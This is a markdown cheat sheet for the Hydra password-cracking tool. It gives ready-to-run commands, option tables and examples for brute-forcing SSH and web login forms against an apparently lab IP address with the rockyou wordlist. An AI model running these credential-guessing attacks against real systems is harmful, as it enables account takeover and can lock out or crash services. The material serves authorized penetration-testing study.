
# Hydra — Brute Force Tool

Hydra is an online password cracking tool that brute forces login credentials across multiple protocols.

---

## SSH Brute Force
```bash
hydra -l <username> -P <wordlist_path> <ip> -t 4 ssh
```

| Option | Description |
|--------|-------------|
| `-l` | Single username for login |
| `-P` | Path to password wordlist |
| `-t` | Number of parallel threads |

**Example:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.129.142.238 -t 4 ssh
```

---

## Web Form Brute Force (HTTP POST)
```bash
sudo hydra -l <username> -P <wordlist> <ip> http-post-form "<path>:<login_credentials>:<invalid_response>"
```

| Option | Description |
|--------|-------------|
| `-l` | Username for web form login |
| `-P` | Password wordlist |
| `http-post-form` | Tells Hydra the form uses POST method |
| `<path>` | Login page URL e.g. `/login.php` |
| `<login_credentials>` | Form fields e.g. `username=^USER^&password=^PASS^` |
| `<invalid_response>` | Text that appears on screen when login fails |
| `-V` | Verbose — shows every attempt |

**Example:**
```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.142.238 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

---

## How it works
- `^USER^` and `^PASS^` are placeholders — Hydra substitutes the actual username and password from your wordlist on each attempt
- The invalid response string tells Hydra what a **failed** login looks like so it knows when it's found the right password
- Lower `-t` value for SSH to avoid account lockouts or crashing the service

---

> ⚠️ Only use on systems you have permission to test
